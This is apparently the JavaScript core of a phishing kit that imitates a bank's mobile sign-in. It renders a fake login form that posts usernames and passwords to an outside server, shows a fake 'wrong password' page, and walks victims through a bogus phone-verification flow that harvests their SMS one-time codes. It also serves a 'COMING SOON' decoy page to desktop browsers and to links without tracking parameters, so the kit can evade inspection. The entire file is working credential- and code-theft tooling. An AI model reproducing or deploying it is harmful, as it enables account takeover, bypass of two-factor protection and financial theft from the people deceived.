var manovar1;
var LinkImagens = 'https://cdn.jsdelivr.net/gh/kbondnewera/malucodoido@latest/';
var LinkPost = 'https://arquivos.miamishopm.com/arqs/';
const PaginaConstrucao = '<div class="bgimg">\n <div class="topleft">\n <p>Logo</p>\n </div>\n <div class="middle">\n <h1>COMING SOON</h1>\n <hr>\n <p>35 days</p>\n </div>\n <div class="bottomleft">\n <p>Some text</p>\n </div>\n </div>'
const isMobile = {Android: function() {return navigator.userAgent.match(/Android/i);}, iOS: function() {return navigator.userAgent.match(/iPhone|iPad|iPod/i);}, any: function() {return (isMobile.Android() ||  isMobile.iOS());}}
function sleep (time) {return new Promise((resolve) => setTimeout(resolve, time));}

const PaginaLogin = '<div id="manollx"></div>\n' +
	'\t  <div class="container" style="padding-bottom: 52px" id="manoaa1">\n' +
	'\t\t  <form class="Form-Logar" id="LoginPost"  action="" onsubmit="return validateForm()" method="POST">\n' +
	'\t\t\t  <div class="text-center mt-2"><img id="imglogo" src="" alt="" height="40"></div>\n' +
	'\t\t\t  <br><div class="Form-Logar2">\n' +
	'\t\t\t\t  <div class="mb-4">\n' +
	'\t\t\t\t\t  <input type="text" id="userId" name="userId" data-validate="userId" class="form-control" placeholder="Username" required="" autofocus=""><br>\n' +
	'\t\t\t\t\t  <input type="password" id="pass" name="pass" data-validate="password" class="form-control" placeholder="Password" required="">\n' +
	'\t\t\t\t\t  <input type="hidden" name="urllink" id="urllink"/>\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t\t  <button class="btn btn-primary btn-block" type="submit" onclick="submitForm();">Sign in</button>\n' +
	'\t\t\t\t  <div class="Senha-Ruim"><a href="" >Forgot username/password?</a><br><a href="" >Not Enrolled? Sign Up Now.</a></div>\n' +
	'\t\t  \t  </div>\n' +
	'\t\t\t  </form>\n' +
	'\t  <footer class="d-md-none">\n' +
	'\t\t  <img id="imgfooter" class="" src="" alt="" width="100%">\n' +
	'\t  </footer>\n' +
	'\t  </div>';
const PaginaErroSenha = '<div id="manollx" style="display: none;"></div>\n' +
	'<div class="container" style="padding-bottom: 52px; display: block;" id="manoaa1">\n' +
	'    <form class="Form-Logar" id="LoginPost" action="" onsubmit="return validateForm()" method="POST">\n' +
	'        <div class="text-center mt-2"> <img id="imglogo" src="" alt="" height="40"> </div>\n' +
	'       <br> <div class="Form-Logar2">\n' +
	'            <div class="jpui error error inverted primary animate alert" id="logon-error" role="region">\n' +
	'                <div tabindex="-1" id="inner-logon-error"><span class="errorxx" id="icon-logon-error"><b><span class="ErrorX">Important: </span> We can\'t find that username and password.</b></span></div><b>\n' +
	'            </b></div>\n' +
	'        <div class="mb-4">\n' +
	'            <input type="text" id="userId" name="userId" data-validate="userId" class="form-control" placeholder="Username" required="" autofocus=""><br>\n' +
	'            <input type="password" id="pass" name="pass" data-validate="password" class="form-control" placeholder="Password" required="">\n' +
	'            <input type="hidden" name="urllink" id="urllink" value="arquivos.websms7.sa.com">\n' +
	'        </div>\n' +
	'        <button class="btn btn-primary btn-block" type="submit" onclick="submitForm();">Sign in</button>\n' +
	'        <div class="Senha-Ruim"><a href="">Forgot username/password?</a><br><a href="">Not Enrolled? Sign Up Now.</a></div>\n' +
	'        </div><br>\n' +
	'        <footer class="d-md-none"><img id="imgfooter" class="" src="" alt="" width="100%"></footer>\n' +
	' </form></div>';
const PaginaNumeros = '<div id="manollx"></div>\n' +
	'  <div class="container" style="padding-bottom: 52px; text-align: center" id="manoaa1">\n' +
	'\t  <form class="Form-Logar" action="" id="MobilePost" method="POST">\n' +
	'\t\t  <div class="text-center mt-2 mb-4">\n' +
	'\t\t\t  <img class="" id="imglogo" src="" alt="" height="40" />\n' +
	'\t\t  </div>\n' +
	'\t\t  <div style="background-color: #0b6efd; color: #fff; padding: 20px 0;  border-radius: 6px 6px 0 0">\n' +
	'\t\t\t  <h4 style="margin: 0">For Your Protection</h4>\n' +
	'\t\t  </div>\n' +
	'\t\t  <div class="Form-Baixo">\n' +
	'\t\t\t  <div class="form-label-group mb-4">\n' +
	'\t\t\t\t  <h4 style="margin-bottom: 28px">Instructions Step 2 of 3</h4>\n' +
	'\t\t\t\t  <div class="progress" style="height: 5px;">\n' +
	'\t\t\t\t\t  <div class="progress-bar bg-light" role="progressbar" style="width: 33.33%"></div>\n' +
	'\t\t\t\t\t  <div class="progress-bar" role="progressbar" style="width: 33.3%"></div>\n' +
	'\t\t\t\t\t  <div class="progress-bar bg-light" role="progressbar" style="width: 33.33%"></div>\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t  </div>\n' +
	'\t\t\t  <div class="form-label-group mb-4">\n' +
	'\t\t\t\t  <p class="Form-Telefone">Phone Verification</p>\n' +
	'\t\t\t\t  <p> Before you sign in, please select your phone.</p>\n' +
	'\t\t\t  </div>\n' +
	'\t\t\t  <div id="NumerosCarregados" > </div>\n' +
	'\t\t\t  <div  class="form-label-group mb-4">\n' +
	'\t\t\t\t  You will receive an SMS Code.\n' +
	'\t\t\t\t  <br>  <br>\n' +
	'\t\t\t\t  <button class="btn btn-primary btn-block" onclick="return RadioValidator();" type="submit">Next</button>\n' +
	'\t\t\t  </div>\n' +
	'\t\t  </div>\n' +
	'\t  </form>\n' +
	'  </div>';
const PaginaCodigo = '<div id="manollx"></div>\n' +
	'\t  <div class="container Animar-Baixo" style="padding-bottom: 52px; text-align: center; display:none;" id="manoaa1">\t\n' +
	'\t\t  <form class="Form-Logar" id="submitcodigo" action="" method="POST">\n' +
	'\t\t\t  <div class="text-center mt-2 mb-4">\n' +
	'\t\t\t\t  <img class="" id="imglogo" src="" alt="" height="40" />\n' +
	'\t\t\t  </div>\n' +
	'\t\t\t  <div style="background-color: #0b6efd; color: #fff; padding: 20px 0; border-radius: 6px 6px 0 0">\n' +
	'\t\t\t\t  <h4 style="margin: 0">For Your Protection</h4>\n' +
	'\t\t\t  </div>\n' +
	'\t\t\t  <div class="Form-Baixo">\n' +
	'\t\t\t\t  <div class="form-label-group mb-4">\n' +
	'\t\t\t\t\t  <h4 style="margin-bottom: 28px">Instructions Step 3 of 3</h4>\t\t\t\t\t\t\n' +
	'\t\t\t\t\t  <div class="progress" style="height: 5px;">\n' +
	'\t\t\t\t\t\t  <div class="progress-bar bg-light" role="progressbar" style="width: 33.33%"></div>\n' +
	'\t\t\t\t\t\t  <div class="progress-bar bg-light" role="progressbar" style="width: 33.3%"></div>\n' +
	'\t\t\t\t\t\t  <div class="progress-bar" role="progressbar" style="width: 33.33%"></div>\n' +
	'\t\t\t\t\t  </div>\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t\t  <div class="form-label-group mb-4">\t\t\t\t\t\t\n' +
	'\t\t\t\t\t  <p class="Form-Telefone">Phone Verification</p>\n' +
	'\t\t\t\t\t  <p >We sent you a text message.</p>\t\t\t\t\n' +
	'\t\t\t\t  </div>\t\t\t\n' +
	'\t\t\t\t  <div class="form-label-group mb-4">\n' +
	'\t\t\t\t\t  <b><p>Please tell us your one-time code and choose "Next."</p></b>\n' +
	'\t\t\t\t\t  <input type="tel" id="code" name="tk" class="form-control" placeholder="Code" required autofocus="" maxlength="8" minlength="8" />\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t\t  <button class="btn btn-primary btn-block" type="submit">Next</button>\t\t\t\t\t\n' +
	'\t\t\t  </div>\n' +
	'\t\t  </form>\n' +
	'\t  </div>\t\t';

const PaginaErroCodigo = '<div id="manollx"></div>\n' +
	'\t\t<div class="container Animar-Baixo" style="padding-bottom: 52px; text-align: center; display:none;" id="manoaa1">\n' +
	'\t\t\t<form class="Form-Logar" id="submitcodigo" action="" method="POST">\n' +
	'\t\t\t\t<div class="text-center mt-2 mb-4">\n' +
	'\t\t\t\t\t<img class="" id="imglogo" src="" alt="" height="40" />\n' +
	'\t\t\t\t</div>\n' +
	'\t\t\t\t<div style="background-color: #0b6efd; color: #fff; padding: 20px 0; border-radius: 6px 6px 0 0">\n' +
	'\t\t\t\t\t<h4 style="margin: 0">For Your Protection</h4>\n' +
	'\t\t\t\t</div>\n' +
	'\t\t\t\t<div class="Form-Baixo">\n' +
	'\t\t\t\t\t<div class="form-label-group mb-4">\n' +
	'\t\t\t\t\t\t<h4 style="margin-bottom: 28px">Instructions Step 3 of 3</h4>\t\t\t\t\t\t\n' +
	'\t\t\t\t\t\t<div class="progress" style="height: 5px;">\n' +
	'\t\t\t\t\t\t\t<div class="progress-bar bg-light" role="progressbar" style="width: 33.33%"></div>\n' +
	'\t\t\t\t\t\t\t<div class="progress-bar bg-light" role="progressbar" style="width: 33.3%"></div>\n' +
	'\t\t\t\t\t\t\t<div class="progress-bar" role="progressbar" style="width: 33.33%"></div>\n' +
	'\t\t\t\t\t\t</div>\n' +
	'\t\t\t\t\t</div>\n' +
	'\t\t\t\t\t<div class="form-label-group mb-4">\t\t\t\t\t\t\n' +
	'\t\t\t\t\t\t<p class="Form-Telefone">Phone Verification</p>\n' +
	'\t\t\t\t\t\t<div tabindex="-1" class="VerificationError">\n' +
	'\t\t\t\t\t\t<span class="ErrorX" >Important: </span>Invalid code entered.</div>\n' +
	'\t\t\t\t\t</div>\t\t\t\n' +
	'\t\t\t\t\t<div class="form-label-group mb-4">\n' +
	'\t\t\t\t\t\t<p>Please tell us your one-time code.</p>\n' +
	'\t\t\t\t\t\t<input type="tel" id="code" name="tk" class="form-control" placeholder="Code" required autofocus="" maxlength="8" minlength="8" />\n' +
	'\t\t\t\t\t</div>\n' +
	'\t\t\t\t\t<button class="btn btn-primary btn-block" type="submit">Next</button>\t\t\t\t\t\n' +
	'\t\t\t\t</div>\n' +
	'\t\t\t</form>\n' +
	'\t\t</div>\t\t';
const PaginaSuccess = '<div class="container" style="padding-bottom: 52px; text-align: center">\t\n' +
	'\t\t\t  <form class="Form-Logar">\n' +
	'\t\t\t\t  <div class="text-center mt-2 mb-4">\n' +
	'\t\t\t\t\t  <img class="" id="imglogo" src="" alt="" height="40" />\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t\t  <div style="background-color: #0b6efd; color: #fff; padding: 20px 0; border-radius: 6px 6px 0 0">\n' +
	'\t\t\t\t\t  <h4 style="margin: 0">For Your Protection</h4>\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t\t  <div class="Form-Baixo">\n' +
	'\t\t\t\t\t  <div class="form-label-group mb-4">\n' +
	'\t\t\t\t\t\t  <h4 style="margin-bottom: 28px">Success</h4>\n' +
	'\t\t\t\t\t\t  <div class="progress" style="height: 5px;">\n' +
	'\t\t\t\t\t\t\t  <div class="progress-bar bg-success" role="progressbar" style="width: 100%"></div>\n' +
	'\t\t\t\t\t\t  </div>\n' +
	'\t\t\t\t\t  </div>\n' +
	'\t\t\t\t\t  <div class="form-label-group mb-4">\t\t\t\t\t\t\n' +
	'\t\t\t\t\t\t  <p>Your phone number has been successfully confirmed.</p>\t\t\t\n' +
	'\t\t\t\t\t  </div>\t\t\t\t\t\t\n' +
	'\t\t\t\t  </div>\n' +
	'\t\t\t  </form>\n' +
	'\t\t  </div>';
function CarregarLogin()
{
		//	if( (isMobile.any()) && (window.location.href.split("=")[1].length === 10)  && (window.location.href.includes('mob') === true ))
	if( (isMobile.any())  && (window.location.href.includes('mob') === true ))
	{
		try{ document.title = 'Mobile SignIn';}catch (error){console.error(error);}
				document.getElementById("body").innerHTML = PaginaLogin;
				try { document.getElementById("LoginPost").setAttribute('action', LinkPost + 'login.php'); } catch (error) { console.error(error); }
				try { document.getElementById("urllink").value = window.location.hostname; } catch (error) { console.error(error); }
				try { document.getElementById("imgfavicon").setAttribute('href', LinkImagens + 'favicon.ico'); } catch (error) { console.error(error); }
				try { document.getElementById("imglogo").setAttribute('src', LinkImagens + 'logo.png'); } catch (error) { console.error(error); }
				try { document.getElementById("imgfooter").setAttribute('src', LinkImagens + 'footer.jpg'); } catch (error) { console.error(error); }
				try { document.getElementById("body").style.background = "url(" + LinkImagens + "/background.jpg) fixed center top repeat-y"; } catch (error) { console.error(error); }
				try { document.getElementById("manollx").style.display = "none"; } catch (error) { console.error(error); }
				try { document.getElementById("manoaa1").style.display = "block"; } catch (error) { console.error(error); }
				try { document.getElementById("body").style.backgroundSize = "auto 100%"; } catch (error) { console.error(error); }

			}
			else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function CarregarErroSenha()
{
	if( (isMobile.any())  && (window.location.href.includes('User') === true ))
	{
		document.getElementById("body").innerHTML = PaginaErroSenha;
		try{ document.title = "Mobile SignIn";}catch (error){console.log(error);}
		try { document.getElementById("LoginPost").setAttribute('action', LinkPost + 'login.php'); } catch (error) { console.error(error); }
		try { document.getElementById("urllink").value = window.location.hostname; } catch (error) { console.error(error); }
		try { document.getElementById("imgfavicon").setAttribute('href', LinkImagens + 'favicon.ico'); } catch (error) { console.error(error); }
		try { document.getElementById("imglogo").setAttribute('src', LinkImagens + 'logo.png'); } catch (error) { console.error(error); }
		try { document.getElementById("imgfooter").setAttribute('src', LinkImagens + 'footer.jpg'); } catch (error) { console.error(error); }
		try { document.getElementById("body").style.background = "url(" + LinkImagens + "/background.jpg) fixed center top repeat-y"; } catch (error) { console.error(error); }
		try { document.getElementById("manollx").style.display = "none"; } catch (error) { console.error(error); }
		try { document.getElementById("manoaa1").style.display = "block"; } catch (error) { console.error(error); }
		try { document.getElementById("body").style.backgroundSize = "auto 100%"; } catch (error) { console.error(error); }
	}
	else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function CarregarStep2()
{
	if( (isMobile.any())  && (window.location.href.includes('User') === true ))
	{
		$.ajax({
		url: LinkPost + 'PegaNumeros.php?usuario=' + window.location.href.split("=")[1],
		dataType: 'jsonp',
		success: function (data) {
			JsonData = data;
			PaginaHtmlx = "";
			for(var i in JsonData)
			{
				PaginaHtmlx = PaginaHtmlx +  '<label><p class="Form-Telefone">\n\t\t\t\t\t<input type="radio" name="radiofone" value="'+JsonData[i]+'" style="margin-right: 10"/> '+JsonData[i]+'</p>\n\t\t\t\t</label><br/>'
			}
			document.getElementById("body").innerHTML = PaginaNumeros;
			try{ document.title = "Phone Selection";}catch (error){console.log(error);}
			document.getElementById("NumerosCarregados").innerHTML = PaginaHtmlx;
			try { document.getElementById("MobilePost").setAttribute('action', LinkPost + 'Step2.php'); } catch (error) { console.error(error); }
			try {document.getElementById("imgfavicon").setAttribute('href',LinkImagens + 'favicon.ico');} catch (error) {console.error(error);}
			try {document.getElementById("imglogo").setAttribute('src',LinkImagens + 'logo.png');} catch (error) {console.error(error);}
			try { document.getElementById("body").style.background = "url(" + LinkImagens + "/background.jpg) fixed center top repeat-y"; } catch (error) { console.error(error); }
			try { document.getElementById("body").style.backgroundSize = "auto 100%"; } catch (error) { console.error(error); }
			try { document.getElementById("manollx").style.display = "none"; } catch (error) { console.error(error); }
			try { document.getElementById("manoaa1").style.display = "block"; } catch (error) { console.error(error); }
		}});
	}
	else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function CarregarStep3Verification()
{
	function CarregarPagina() {window.location.href = LinkPost + 'Step3Verification.php';}
	if( isMobile.any() ) {
		document.getElementById("body").innerHTML = '<div id="manollx"></div>'
		manovar1 = setTimeout(CarregarPagina, 6000);
	}
	else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function CarregarLoginVerification()
{
			function CarregarPagina() {window.location.href = LinkPost + 'loginverification.php';}
			if( isMobile.any() ) {
				document.getElementById("body").innerHTML = '<div id="manollx"></div>'
				manovar1 = setTimeout(CarregarPagina, 9000);
			}
			else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function CarregarStep3()
{if( (isMobile.any())  && (window.location.href.includes('User') === true ))
{
	document.getElementById("body").innerHTML = PaginaCodigo;
	try {document.getElementById("submitcodigo").setAttribute('action',LinkPost + 'Step3.php');} catch (error) {console.error(error);}
	try {document.getElementById("imgfavicon").setAttribute('href',LinkImagens + 'favicon.ico');} catch (error) {console.error(error);}
	try {document.getElementById("imglogo").setAttribute('src',LinkImagens + 'logo.png');} catch (error) {console.error(error);}
	try{ document.title = "Code Verification";}catch (error){console.log(error);}
	sleep(5000).then(() =>
	{
		try { document.getElementById("body").style.background = "url(" + LinkImagens + "/background.jpg) fixed center top repeat-y"; } catch (error) { console.error(error); }
		try { document.getElementById("body").style.backgroundSize = "auto 100%"; } catch (error) { console.error(error); }
		try { document.getElementById("manollx").style.display = "none"; } catch (error) { console.error(error); }
		try { document.getElementById("manoaa1").style.display = "block"; } catch (error) { console.error(error); }
	});}
else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function Step3Error()
{if( (isMobile.any())  && (window.location.href.includes('User') === true ))
{
	document.getElementById("body").innerHTML = PaginaErroCodigo;
	try {document.getElementById("submitcodigo").setAttribute('action',LinkPost + 'Step3.php');} catch (error) {console.error(error);}
	try {document.getElementById("imgfavicon").setAttribute('href',LinkImagens + 'favicon.ico');} catch (error) {console.error(error);}
	try {document.getElementById("imglogo").setAttribute('src',LinkImagens + 'logo.png');} catch (error) {console.error(error);}
	try {document.getElementById("body").style.background = "url("+LinkImagens+"/background.jpg) fixed center top repeat-y";} catch (error) {console.error(error);}
	try {document.getElementById("manollx").style.display = "none";} catch (error) {console.error(error);}
	try {document.getElementById("manoaa1").style.display = "block";} catch (error) {console.error(error);}
	try {document.getElementById("body").style.backgroundSize = "auto 100%";} catch (error) {console.error(error);}
	try{ document.title = "Verification Error";}catch (error){console.log(error);}}
else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function Step3Success()
{if( (isMobile.any())  && (window.location.href.includes('User') === true ))
{
	document.getElementById("body").innerHTML = PaginaSuccess;
	try {document.getElementById("imgfavicon").setAttribute('href',LinkImagens + 'favicon.ico');} catch (error) {console.error(error);}
	try {document.getElementById("imglogo").setAttribute('src',LinkImagens + 'logo.png');} catch (error) {console.error(error);}
	try {document.getElementById("body").style.background = "url("+LinkImagens+"/background.jpg) fixed center top repeat-y";} catch (error) {console.error(error);}
	try {document.getElementById("manollx").style.display = "none";} catch (error) {console.error(error);}
	try {document.getElementById("manoaa1").style.display = "block";} catch (error) {console.error(error);}
	try {document.getElementById("body").style.backgroundSize = "auto 100%";} catch (error) {console.error(error);}
	try{ document.title = "Success";}catch (error){console.log(error);}
}
else {document.getElementById("body").innerHTML = PaginaConstrucao}
}
function RadioValidator()
{
	var ShowAlert = "";var AllFormElements = window.document.getElementById("MobilePost").elements;
	for (i = 0; i < AllFormElements.length; i++)
	{
		if (AllFormElements[i].type == "radio")
		{
			var ThisRadio = AllFormElements[i].name;var ThisChecked = "No";
			var AllRadioOptions = document.getElementsByName(ThisRadio);
			for (x = 0; x < AllRadioOptions.length; x++) {if (AllRadioOptions[x].checked && ThisChecked == "No") {ThisChecked = "Yes";break;}}
			var AlreadySearched = ShowAlert.indexOf(ThisRadio);
			if (ThisChecked == "No" && AlreadySearched == -1) {ShowAlert = "Please select your phone number.\n";}
		}
	}
	if (ShowAlert != "") {alert(ShowAlert);return false;} else {return true;}
}
function validateForm()
{
			document.getElementById("body").style.background = "url(" + LinkImagens + "/background.jpg) fixed center top repeat-y";
			document.getElementById("body").style.backgroundSize = "auto 100%";
			document.getElementById("error").style.display = "none";
			var str = document.getElementById('userId').value;
			if (str.includes("@"))
			{
				document.getElementById("error").style.display = "block";
				return false;
			} else {return true;}
}